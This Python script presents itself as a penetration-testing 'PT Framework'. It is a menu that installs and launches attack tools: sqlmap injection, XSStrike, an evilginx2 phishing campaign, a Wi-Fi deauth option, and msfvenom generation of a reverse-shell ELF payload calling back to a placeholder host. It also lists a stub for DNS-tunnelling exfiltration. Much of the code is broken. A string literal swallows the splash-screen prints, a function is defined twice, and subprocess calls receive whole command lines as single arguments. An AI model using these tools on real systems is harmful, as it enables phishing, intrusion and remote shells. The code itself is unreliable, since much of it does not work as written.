import subprocess
import sys
import os
import asyncio
import aiohttp
import json

# Function to install missing tools
def install_tool(tool_name):
    """Install a missing tool by providing numbered options for package managers."""
    print(f"\n[*] {tool_name} is not installed. Please choose an option to install it:")

    options = {
        'sqlmap': {
            '1': 'Install using apt (Linux)',
            '2': 'Install using pip (Python)',
            '3': 'Install using Homebrew (macOS)',
        },
        'xsstrike': {
            '1': 'Install using apt (Linux)',
            '2': 'Install using pip (Python)',
            '3': 'Install from GitHub (latest version)',
        },
        'aircrack-ng': {
            '1': 'Install using apt (Linux)',
            '2': 'Install using brew (macOS)',
            '3': 'Install from GitHub (latest version)',
        },
    }

    if tool_name in options:
        for key, value in options[tool_name].items():
            print(f"{key}. {value}")

        choice = input("Enter your choice: ").strip()

        if choice == '1':
            print(f"[*] Installing {tool_name} using apt...")
            subprocess.run(["sudo", "apt-get", "install", tool_name])
        elif choice == '2':
            if tool_name == 'sqlmap':
                print("[*] Installing sqlmap using pip...")
                subprocess.run([sys.executable, "-m", "pip", "install", "sqlmap"])
            elif tool_name == 'xsstrike':
                print("[*] Installing xsstrike using pip...")
                subprocess.run([sys.executable, "-m", "pip", "install", "xsstrike"])
            elif tool_name == 'aircrack-ng':
                print("[*] Installing aircrack-ng using brew...")
                subprocess.run(["brew", "install", "aircrack-ng"])
        elif choice == '3':
            if tool_name == 'xsstrike':
                print("[*] Installing xsstrike from GitHub (latest version)...")
                subprocess.run(["git", "clone", "https://github.com/UltimateHackers/XSStrike.git"])
                subprocess.run(["cd", "XSStrike", "&&", "python3", "setup.py", "install"])
            elif tool_name == 'aircrack-ng':
                print("[*] Installing aircrack-ng from GitHub (latest version)...")
                subprocess.run(["git", "clone", "https://github.com/aircrack-ng/aircrack-ng.git"])
                subprocess.run(["cd", "aircrack-ng", "&&", "make", "&&", "sudo", "make", "install"])
            else:
                print(f"[*] Installation option for {tool_name} is not available. Please visit official documentation.")
        else:
            print("[!] Invalid choice. Please try again.")
    else:
        print(f"[*] No installation options available for {tool_name}.")


def check_tool(tool_name):
    """Check if a tool is installed."""
    try:
        subprocess.run([tool_name, '--help'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except FileNotFoundError:
        return False

def check_tools():
    """Check and handle missing tools."""
    missing_tools = ['sqlmap', 'xsstrike', 'aircrack-ng']  # Add more tools as needed
    for tool in missing_tools:
        if not check_tool(tool):
            print(f"\n[*] {tool} is not installed.")
            install_tool(tool)
        else:
            print(f"[*] {tool} is already installed.")


def display_splash_screen():
    splash = """
  _____________________  ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
\______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
 |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
 |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_  /\____   |           \_____  /___|
                 /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     

    print(splash)
    print("Welcome to the PT Framework!\n")
"""

# Tools and their commands
TOOLS = {
    'sqlmap': 'sqlmap --help',
    'xsstrike': 'xsstrike --help',
    'aircrack-ng': 'airmon-ng --help',
    'metasploit': 'msfvenom --help',
    'evilginx2': 'evilginx2 --help',
    'nmap': 'nmap -v',
    'nessus': 'nessus -h',
    'dnscat2': 'dnscat2 --help',
}

# Global settings
TARGET = None
USER_AGENT = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# Tool checking function
def check_tools():
    missing_tools = []
    for tool, command in TOOLS.items():
        if not check_tool(tool):
            missing_tools.append(tool)
    if missing_tools:
        print(f"Warning: Missing tools: {', '.join(missing_tools)}")
        for tool in missing_tools:
            install_tool(tool)
    else:
        print("All tools are installed and ready!")

# Phishing Campaign with Evilginx2
def phishing_campaign():
    print("[*] Starting Phishing Campaign with Evilginx2...")
    subprocess.run(["evilginx2", "launch"])

# SQL Injection with sqlmap
def sql_injection(url):
    print(f"[*] Running SQL Injection Test on {url}")
    subprocess.run([TOOLS['sqlmap'], f"-u {url} --batch"])

# XSS Testing with XSStrike
def test_xss(url):
    print(f"[*] Running XSS Testing on {url}")
    subprocess.run([TOOLS['xsstrike'], f"-u {url} --batch"])

# Network Scanning with Nmap
def network_scan(target):
    print(f"[*] Running Network Scan on {target}")
    subprocess.run([TOOLS['nmap'], target])

# Wi-Fi Deauth Attack with aircrack-ng
def wifi_attack(interface):
    print(f"[*] Setting {interface} to monitor mode for Wi-Fi attacks...")
    subprocess.run(["airmon-ng", "start", interface])
    subprocess.run(["airodump-ng", interface])

# Metasploit Payload Generation
def metasploit_payload():
    print("[*] Generating Metasploit payload...")
    subprocess.run([TOOLS['metasploit'], "-p linux/x86/shell_reverse_tcp LHOST=your_ip LPORT=4444 -f elf > shell.elf"])

# Subdomain Enumeration using custom script
async def fetch(session, url):
    """Fetch data from a URL."""
    async with session.get(url) as response:
        return await response.text()

async def subdomain_enum(domain):
    """Fetch subdomains."""
    url = f"https://crt.sh/?q={domain}"
    async with aiohttp.ClientSession() as session:
        page = await fetch(session, url)
        print(page)  # You can improve this part to process and extract subdomains

def main():
    display_splash_screen()

    # Check for tools and prompt to install missing ones
    check_tools()

    # Main loop
    while True:
        print("\nSelect an option:")
        print("1. Run SQL Injection Test     2. Run XSS Test")
        print("3. Start Phishing Campaign    4. Run Network Scan")
        print("5. Run Wi-Fi Deauth Attack    6. Generate Metasploit Payload")
        print("7. Subdomain Enumeration      8. Data Exfiltration via DNS Tunneling")
        print("9. Exit")

        choice = input("Enter choice: ")

        if choice == '1':
            url = input("Enter the target URL: ")
            sql_injection(url)
        elif choice == '2':
            url = input("Enter the target URL: ")
            test_xss(url)
        elif choice == '3':
            phishing_campaign()
        elif choice == '4':
            target = input("Enter target IP/URL: ")
            network_scan(target)
        elif choice == '5':
            interface = input("Enter network interface: ")
            wifi_attack(interface)
        elif choice == '6':
            metasploit_payload()
        elif choice == '7':
            domain = input("Enter domain for subdomain enumeration: ")
            asyncio.run(subdomain_enum(domain))
        elif choice == '8':
            print("[*] Data Exfiltration via DNS Tunneling is under development...")
        elif choice == '9':
            print("Exiting...")
            break
        else:
            print("Invalid choice, please try again.")

if __name__ == "__main__":
    main()
